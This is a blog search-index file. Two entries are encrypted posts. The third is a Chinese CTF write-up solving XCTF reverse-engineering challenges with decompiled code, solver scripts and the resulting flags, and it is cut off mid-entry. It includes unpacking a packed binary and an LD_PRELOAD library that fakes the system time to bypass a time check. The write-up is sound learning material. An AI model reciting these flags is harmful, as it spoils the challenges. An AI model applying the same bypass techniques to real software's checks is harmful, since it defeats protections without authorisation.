<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ida小技巧</title>
    <url>/posts/520268f2/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。">
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="de15bbb1b148a730e41ce89a69977ef16ff8cb50b5dc8e20078bedc3bfd792a6">88297ae6ef5b1754b8d7392e09a2f26d29286dc3451e61d131e26e413c31f0e9263e9af48b4bf001c234b3dbb60bd048d6e40749e4fe58e6fb61e031717bccd4326c8bfa9e9fb127e0591a89eed631812ffdadbb548574b45d27c21cfcfbc65590bf3341c4e6c9dfd671090288fefe861f5e641b2738aca7d59429029fa97e98f1c8c5fc0f426979526b6c96ba1ef9d67a8821af45d210e03b9b0bbe26f1237f1d844605961748fee8629c55290daab998fc1ba89e6f0725301ffa8787173cd398ace7619cbe2c089f2182f76c0f9774b01afe9610a96a71a3ce5d733c4d4908e0e7166fa368ba75d26a6a06c2158a6f77505c31498f6b9f722baad238fa1b73d688b9c1a2b1b4169cd7b79eb7d98c0a48d3a595759a4420a65759bf5852135f66702bd4a211915c010c9bd34a7bf9a0d05c12a97e2a6712453df2d73a26fd27449715cf0ccb30a8a340b6228621f47d09c2b1917d7106b58d61a024ace2f71a7ad728dcd577fdae71a2a645a5e568468dc2e35f58c60808e8554534e15c7190f96c7a2db96de15940e95825b0e650792b943b8b5d0681b37417ccfbc3d71553229bcca68e7af9bddad17277f4b8e33b3b5517b9ac0b9038992667c3db87b878c831c9e5c0baae0882ab8a4836fef18969e6c02248f89e1b49dd8e4b5bdfa2d483051c291ae32c9a85a4ee019a6866b19593b1f6d6c41b7a10c3623118dcf5ba3af3cdf1f20b0b9b53de75991e78332b2909eeaefcf39e7cb6288305c6f41535cab7d5f6d9cadaf5a16dd8fef2732ae9d223e73b0fee764b86fa9f9c75e17692589e5ee17e782c85863ed64d1516250d</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>基础</category>
      </categories>
  </entry>
  <entry>
    <title>awd</title>
    <url>/posts/9cf53275/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。">
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="dd4dcc2aea51c8592269c463f6c13b91f13c745d3defc41e2e05252790644313">88297ae6ef5b1754b8d7392e09a2f26d29286dc3451e61d131e26e413c31f0e9263e9af48b4bf001c234b3dbb60bd048d6e40749e4fe58e6fb61e031717bccd4326c8bfa9e9fb127e0591a89eed631810c7b284592ac666649117443987a2aa2f5068a4e2bbf6eb01f162c5cf97c65ba084f2a912c3e9722b1a1811075518b2a8e6c995cd2dfc860c075ee0e575f3bd746a40636db64bb7b864ca54710a119a316955f21a29eeb012d232250d6d0e018db255fd536303fa0018323d1ee96370d454a80cc976639e8540b820195271c7f844a37965cfc43307a165bb9d138b623188bfa7c7f502200819c8c9a0f4e77d28458bf103f6c4bcf08a2cced875c0a76232b0d089c3de98014c35baa71621d33d3b26c7ea647dcca88c598205ea46b839d09a49a0bbb0dcc07fea31f751ae2ff92c4f7ed19670774485b7c9850f7096af4f2eabc157f712d9d4f5787045bd1eca0d6befbd7fb4aff8f7a9c1a37679ce1b0af89cc05b1d845c11a70c1ec3d4521766e2d0b3a5ca24556734ef85413a44816b954af00181ca9ded7f0fc2486d32ab982ae8934b4c505993163630f61f95e50c2047ef063ff4a7cd5d2cce9c76f4e2b92d4abfa1bc502415b725ba4922145b3c17697e6a74317e380f6e37e8210e4be76cea03efd8df6f0162706b5b3b21943f29e057b9971bd2b4970d2665cfe4ac32ac436b0588caf26c6f4dcda014566</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>基础</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界高手区re</title>
    <url>/posts/c8f4b23e/</url>
    <content><![CDATA[<h1 id="高手区re"><a href="#高手区re" class="headerlink" title="高手区re"></a>高手区re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>gdb调试拿到flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/s <span class="variable">$esp</span>+0x24</span><br><span class="line">0xffffd174:	<span class="string">"SECCON&#123;Welcome to the SECCON 2014 CTF!&#125;"</span></span><br></pre></td></tr></table></figure><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">MD5 *__fastcall MD5::init(MD5 *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  MD5 *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">this</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">this</span> + <span class="number">17</span>) = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">this</span> + <span class="number">18</span>) = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">this</span> + <span class="number">19</span>) = <span class="number">0x67452301</span>;</span><br><span class="line">  *(<span class="keyword">this</span> + <span class="number">20</span>) = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">  *(<span class="keyword">this</span> + <span class="number">21</span>) = <span class="number">0x98BADCFE</span>;</span><br><span class="line">  result = <span class="keyword">this</span>;</span><br><span class="line">  *(<span class="keyword">this</span> + <span class="number">22</span>) = <span class="number">0x10325476</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>md5的4个常数，没改，所以百度搜下md5解密，解780438d5b6e29db0898bc4f0225935c0<br>解出来就是这个<br>hash: b781cbb29054db12f88f08c6e161c199</p><h2 id="re3"><a href="#re3" class="headerlink" title="re3"></a>re3</h2><p>dump出数据跑一下就好</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">List1 = [<span class="number">0x00000024</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000036</span>, <span class="number">0x00000065</span>, <span class="number">0x00000007</span>, <span class="number">0x00000027</span>, <span class="number">0x00000026</span>, <span class="number">0x0000002D</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000056</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000065</span>, <span class="number">0x00000003</span>, <span class="number">0x0000002D</span>, <span class="number">0x00000016</span>, <span class="number">0x00000002</span>, <span class="number">0x00000015</span>, <span class="number">0x00000003</span>, <span class="number">0x00000065</span>, <span class="number">0x00000000</span>, <span class="number">0x00000029</span>, <span class="number">0x00000044</span>, <span class="number">0x00000044</span>, <span class="number">0x00000001</span>, <span class="number">0x00000044</span>, <span class="number">0x0000002B</span>]</span><br><span class="line">string = <span class="string">"L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_&#123;FL4G&#125;_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t"</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">    flag += string[List1[i]]</span><br><span class="line">    print(flag)</span><br><span class="line"><span class="comment">#ALEXCTF&#123;W3_L0v3_C_W1th_CL45535&#125;</span></span><br></pre></td></tr></table></figure><h2 id="re4"><a href="#re4" class="headerlink" title="re4"></a>re4</h2><p>北斗壳，用nspack脱掉</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">List =[<span class="number">0x00000012</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000014</span>, <span class="number">0x00000024</span>, <span class="number">0x0000005C</span>, <span class="number">0x0000004A</span>, <span class="number">0x0000003D</span>, <span class="number">0x00000056</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000010</span>, <span class="number">0x00000067</span>, <span class="number">0x00000000</span>, <span class="number">0x00000041</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000046</span>, <span class="number">0x0000005A</span>, <span class="number">0x00000044</span>, <span class="number">0x00000042</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000044</span>, <span class="number">0x00000072</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000040</span>, <span class="number">0x0000003E</span>, <span class="number">0x0000004B</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x0000004C</span>, <span class="number">0x0000005E</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000017</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000016</span>, <span class="number">0x00000068</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000012</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>]</span><br><span class="line">string = <span class="string">"this_is_not_flag"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(List)):</span><br><span class="line">    first = ord(string[i%<span class="number">16</span>])</span><br><span class="line">    second = chr( first ^ List[i] )</span><br><span class="line">    flag += second</span><br><span class="line">    print(flag)</span><br><span class="line"><span class="comment">#flag&#123;59b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;</span></span><br></pre></td></tr></table></figure><h2 id="re5"><a href="#re5" class="headerlink" title="re5"></a>re5</h2><p>强，mips的题目</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">string = <span class="string">"cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">    first = ord(i)^<span class="number">55</span></span><br><span class="line">    flag += chr(first)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 retdec-decompiler.py ~/Downloads/比赛/xctf/逆向进阶/<span class="number">5</span></span><br></pre></td></tr></table></figure><p>利用retdec获得c代码，成功</p><p>ghidra也可以反编译mips好强<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117115746.png" alt></p><h2 id="re6"><a href="#re6" class="headerlink" title="re6"></a>re6</h2><p>c++的，读懂流程后写代码<br>坑点。。。要逆序<br>还是小端序问题</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">string1 = <span class="string">'htadimehtadimeht'</span>[::<span class="number">-1</span>] + <span class="string">"dime"</span>[::<span class="number">-1</span>] + <span class="string">'a'</span></span><br><span class="line">string2 = <span class="string">'&lt;&lt;&lt;....++++----&gt;'</span>[::<span class="number">-1</span>] + <span class="string">'.&lt;'</span>[::<span class="number">-1</span>]</span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(string2)):</span><br><span class="line">    result = (ord(string1[i]) ^ ord(string2[i]))+<span class="number">22</span></span><br><span class="line">    key += chr(result)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    flag += chr(ord(i)+<span class="number">9</span>)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><h2 id="re7"><a href="#re7" class="headerlink" title="re7"></a>re7</h2><p>第一个idapython脚本取了数据，具体在另一篇博客里</p><p>可以看出这个前面的检查跟后面的没关系，可以nop掉或者直接gdb调试拿flag都可以<br>这不是我想要的，我还是想学算法。。<br>flag_is_you_know_cracking!!!</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">List = [<span class="number">84</span>, <span class="number">200</span>, <span class="number">126</span>, <span class="number">227</span>, <span class="number">100</span>, <span class="number">199</span>, <span class="number">22</span>, <span class="number">154</span>, <span class="number">205</span>, <span class="number">17</span>, <span class="number">101</span>, <span class="number">50</span>, <span class="number">45</span>, <span class="number">227</span>, <span class="number">211</span>, <span class="number">67</span>, <span class="number">146</span>, <span class="number">169</span>, <span class="number">157</span>, <span class="number">210</span>, <span class="number">230</span>, <span class="number">109</span>, <span class="number">44</span>, <span class="number">211</span>, <span class="number">182</span>, <span class="number">189</span>, <span class="number">254</span>, <span class="number">106</span>]</span><br><span class="line">flag_data = [<span class="number">0xDC</span>, <span class="number">0x17</span>, <span class="number">0xBF</span>, <span class="number">0x5B</span>, <span class="number">0xD4</span>, <span class="number">0x0A</span>, <span class="number">0xD2</span>, <span class="number">0x1B</span>, <span class="number">0x7D</span>, <span class="number">0xDA</span>, <span class="number">0xA7</span>, <span class="number">0x95</span>, <span class="number">0xB5</span>, <span class="number">0x32</span>, <span class="number">0x10</span>, <span class="number">0xF6</span>, <span class="number">0x1C</span>, <span class="number">0x65</span>, <span class="number">0x53</span>, <span class="number">0x53</span>, <span class="number">0x67</span>, <span class="number">0xBA</span>, <span class="number">0xEA</span>, <span class="number">0x6E</span>, <span class="number">0x78</span>, <span class="number">0x22</span>, <span class="number">0x72</span>, <span class="number">0xD3</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">List1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(List), <span class="number">4</span>):</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    result += hex(List[i+<span class="number">3</span>])[<span class="number">2</span>:].zfill(<span class="number">2</span>)+ hex(List[i+<span class="number">2</span>])[<span class="number">2</span>:].zfill(<span class="number">2</span>) + hex(List[i+<span class="number">1</span>])[<span class="number">2</span>:].zfill(<span class="number">2</span>) + hex(List[i])[<span class="number">2</span>:].zfill(<span class="number">2</span>) </span><br><span class="line">    List1.append(int(result, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">List2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(List), <span class="number">4</span>):</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    result += hex(flag_data[i+<span class="number">3</span>])[<span class="number">2</span>:].zfill(<span class="number">2</span>) + hex(flag_data[i+<span class="number">2</span>])[<span class="number">2</span>:].zfill(<span class="number">2</span>) + hex(flag_data[i+<span class="number">1</span>])[<span class="number">2</span>:].zfill(<span class="number">2</span>) + hex(flag_data[i])[<span class="number">2</span>:].zfill(<span class="number">2</span>) </span><br><span class="line">    print(result, )</span><br><span class="line">    List2.append(int(result, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print([hex(i) <span class="keyword">for</span> i <span class="keyword">in</span> List1])</span><br><span class="line">print([hex(i) <span class="keyword">for</span> i <span class="keyword">in</span> List2])</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    v3 = List1[i]^<span class="number">0xDEADBEEF</span> </span><br><span class="line">    print(hex(v3))</span><br><span class="line">    temp = hex(v3)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">    v3 = [ int(temp[<span class="number">6</span>:<span class="number">8</span>], <span class="number">16</span>), int(temp[<span class="number">4</span>:<span class="number">6</span>], <span class="number">16</span>), int(temp[<span class="number">2</span>:<span class="number">4</span>], <span class="number">16</span>), int(temp[:<span class="number">2</span>], <span class="number">16</span>) ]</span><br><span class="line">    temp = hex(List2[i])[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    v4 = [ int(temp[<span class="number">6</span>:<span class="number">8</span>], <span class="number">16</span>), int(temp[<span class="number">4</span>:<span class="number">6</span>], <span class="number">16</span>), int(temp[<span class="number">2</span>:<span class="number">4</span>], <span class="number">16</span>), int(temp[:<span class="number">2</span>], <span class="number">16</span>) ]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        print(hex(v3[j]), hex(v4[j]))</span><br><span class="line">        result = v3[j] ^ v4[j]</span><br><span class="line">        flag += chr(result)</span><br><span class="line">        print(flag)</span><br></pre></td></tr></table></figure><p>好简单的题目，可是光是数据转换以及小端逆序就搞了我好久。。。</p><h2 id="re8"><a href="#re8" class="headerlink" title="re8"></a>re8</h2><p>confuse里干了这些事<br>第三部分 转1<br>第四部分 转2<br>第一部分 转3<br>第二部分 转4<br>简单，将结果转换回去就好了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>string = <span class="string">'daf29f59034938ae4efd53fc275d81053ed5be8c'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string[<span class="number">40</span>:]</span><br><span class="line"><span class="string">''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string[<span class="number">31</span>:]</span><br><span class="line"><span class="string">'53ed5be8c'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string[<span class="number">30</span>:]</span><br><span class="line"><span class="string">'053ed5be8c'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'&#123;'</span> + string[<span class="number">20</span>:<span class="number">30</span>] + string[<span class="number">30</span>:] + string[:<span class="number">10</span>] + string[<span class="number">10</span>:<span class="number">20</span>] + <span class="string">'&#125;'</span></span><br><span class="line"><span class="string">'&#123;53fc275d81053ed5be8cdaf29f59034938ae4efd&#125;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(<span class="string">'53fc275d81053ed5be8cdaf29f59034938ae4efd'</span>)</span><br><span class="line"><span class="number">40</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>有坑，不用带{}交flag</p><h2 id="re9"><a href="#re9" class="headerlink" title="re9"></a>re9</h2><p>原来不知道这题要干嘛，看出有base64跟md5<br>后面就不知道了</p><p>emm，这道题又学到新知识了,利用环境变量伪造时间，绕过检测</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">time</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> atoi(getenv(<span class="string">"CURR_TIME"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成动态链接库</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -c -fPIC -o faketime.o faketime.c</span><br><span class="line">gcc -shared -o faketime.so faketime.o</span><br></pre></td></tr></table></figure><p>获得时间戳</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>time_now = time.mktime(time.strptime(<span class="string">'2012-12-21'</span>, <span class="string">'%Y-%m-%d'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>time_now</span><br><span class="line"><span class="number">1356019200.0</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#CURR_TIME=1325347200</span></span><br><span class="line">CURR_TIME=1356019200</span><br><span class="line">LAST_TIME=1356969600</span><br><span class="line">hour=3600</span><br><span class="line"><span class="built_in">export</span> CURR_TIME</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$CURR_TIME</span> -lt <span class="variable">$LAST_TIME</span> ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    value=$(CURR_TIME=<span class="variable">$CURR_TIME</span> LD_PRELOAD=$(<span class="built_in">pwd</span>)/faketime.so ./launcher)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">"<span class="variable">$value</span>"</span> != <span class="string">""</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$value</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        CURR_TIME=$[CURR_TIME+hour]</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>emm在具体分析的话，前面可以看出是%Y-%m-%d将时间戳md5加密，再加上.fluxfingers.net，</p><p>v21 = sub_18A4(dest);<br>if ( !v21 )<br>return 1LL;</p><p>这里是关键函数，截取返回值，动态获得</p><p>在base64解密一次，</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117101242.png" alt></p><p>最后异或0x25</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117101400.png" alt></p><p>就是flag了<br>flag{e3a03c6f3fe91b40eaa8e71b41f0db12}<br>最主要关键点要联想到世界末日时间</p><h2 id="re10"><a href="#re10" class="headerlink" title="re10"></a>re10</h2><p>…手动计算下就出来了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(v11) != <span class="number">16</span></span><br><span class="line">  || v11[<span class="number">0</span>] != <span class="string">'C'</span></span><br><span class="line">  || v11[<span class="number">15</span>] != <span class="string">'X'</span></span><br><span class="line">  || v11[<span class="number">1</span>] != <span class="string">'Z'</span></span><br><span class="line">  || v11[<span class="number">1</span>] + v11[<span class="number">14</span>] != <span class="number">155</span></span><br><span class="line">  || v11[<span class="number">2</span>] != <span class="string">'9'</span></span><br><span class="line">  || v11[<span class="number">2</span>] + v11[<span class="number">13</span>] != <span class="number">155</span></span><br><span class="line">  || v11[<span class="number">3</span>] != <span class="string">'d'</span></span><br><span class="line">  || v11[<span class="number">12</span>] != <span class="string">'7'</span></span><br><span class="line">  || v11[<span class="number">4</span>] != <span class="string">'m'</span></span><br><span class="line">  || v11[<span class="number">11</span>] != <span class="string">'G'</span></span><br><span class="line">  || v11[<span class="number">5</span>] != <span class="string">'q'</span></span><br><span class="line">  || v11[<span class="number">5</span>] + v11[<span class="number">10</span>] != <span class="number">170</span></span><br><span class="line">  || v11[<span class="number">6</span>] != <span class="string">'4'</span></span><br><span class="line">  || v11[<span class="number">9</span>] != <span class="string">'g'</span></span><br><span class="line">  || v11[<span class="number">7</span>] != <span class="string">'c'</span></span><br><span class="line">  || v11[<span class="number">8</span>] != <span class="string">'8'</span> )</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">170</span>-ord(<span class="string">'q'</span>)</span><br><span class="line"><span class="number">57</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">57</span>)</span><br><span class="line"><span class="string">'9'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">155</span>-ord(<span class="string">'9'</span>)</span><br><span class="line"><span class="number">98</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">98</span>)</span><br><span class="line"><span class="string">'b'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">155</span>-ord(<span class="string">'Z'</span>))</span><br><span class="line"><span class="string">'A'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(<span class="string">'CZ9dmq4c8g9G7bAX'</span>)</span><br><span class="line"><span class="number">16</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>CZ9dmq4c8g9G7bAX</p><h2 id="re11"><a href="#re11" class="headerlink" title="re11"></a>re11</h2><p>sub_401000里的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v18 &amp;&amp; *v19 &gt;= v13 )</span><br><span class="line">&#123;</span><br><span class="line">  v21 = <span class="number">3</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v5; --v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v15 = *v7;</span><br><span class="line">    <span class="keyword">if</span> ( *v7 != <span class="string">'\r'</span> &amp;&amp; v15 != <span class="string">'\n'</span> &amp;&amp; v15 != <span class="string">' '</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = byte_414E40[v15];</span><br><span class="line">      v21 -= v16 == <span class="number">64</span>;</span><br><span class="line">      v14 = v16 &amp; <span class="number">0x3F</span> | (v14 &lt;&lt; <span class="number">6</span>);</span><br><span class="line">      <span class="keyword">if</span> ( ++i == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v21 )</span><br><span class="line">          *v12++ = BYTE2(v14);</span><br><span class="line">        <span class="keyword">if</span> ( v21 &gt; <span class="number">1</span> )</span><br><span class="line">          *v12++ = BYTE1(v14);</span><br><span class="line">        <span class="keyword">if</span> ( v21 &gt; <span class="number">2</span> )</span><br><span class="line">          *v12++ = v14;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v7;</span><br><span class="line">  &#125;</span><br><span class="line">  *v19 = v12 - v18;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看出是base64decode</p><p>后面在来一顿异或</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( ; v4 &lt; v3; ++v4 )</span><br><span class="line">  *(&amp;v13 + v4) ^= <span class="number">0x25</span>u;</span><br></pre></td></tr></table></figure><p>所以解密，异或回去，在base64encode<br>中间一顿操作你会发觉他根本没操作你的输入</p><p>XEpQek5LSlJ6TUpSelFKeldASEpTQHpPUEtOekZKQUA=</p><h2 id="re12"><a href="#re12" class="headerlink" title="re12"></a>re12</h2><p>又是一道简单题</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line">List = [<span class="number">0x0D</span>, <span class="number">0x13</span>, <span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x1D</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x19</span>, <span class="number">0x2F</span>, <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x24</span>, <span class="number">0x1F</span>, <span class="number">0x1E</span>, <span class="number">0x16</span>, <span class="number">0x09</span>, <span class="number">0x0F</span>, <span class="number">0x15</span>, <span class="number">0x27</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x0A</span>, <span class="number">0x2F</span>, <span class="number">0x1E</span>, <span class="number">0x1A</span>, <span class="number">0x2D</span>, <span class="number">0x0C</span>, <span class="number">0x22</span>, <span class="number">0x4</span>]</span><br><span class="line">string = <span class="string">"GONDPHyGjPEKruv&#123;&#123;pj]X@rF"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">    first = ord(string[i])^List[i]</span><br><span class="line">    second = (first<span class="number">-72</span>) ^ <span class="number">0x55</span> </span><br><span class="line">    <span class="keyword">if</span> second &gt;=<span class="number">97</span> <span class="keyword">and</span> second &lt;=<span class="number">122</span>:</span><br><span class="line">        second -= <span class="number">32</span></span><br><span class="line">    <span class="keyword">elif</span> second &gt;=<span class="number">65</span> <span class="keyword">and</span> second &lt;=<span class="number">90</span>:</span><br><span class="line">        second += <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    flag += chr(second)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"EIS&#123;"</span> + flag + <span class="string">"&#125;"</span>)</span><br><span class="line"><span class="comment">#EIS&#123;wadx_tdgk_aihc_ihkn_pjlm&#125;</span></span><br></pre></td></tr></table></figure><h2 id="re13"><a href="#re13" class="headerlink" title="re13"></a>re13</h2><p>算法简单，不挣扎了，手动写下出来了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'D'</span>)<span class="number">-1</span>)</span><br><span class="line"><span 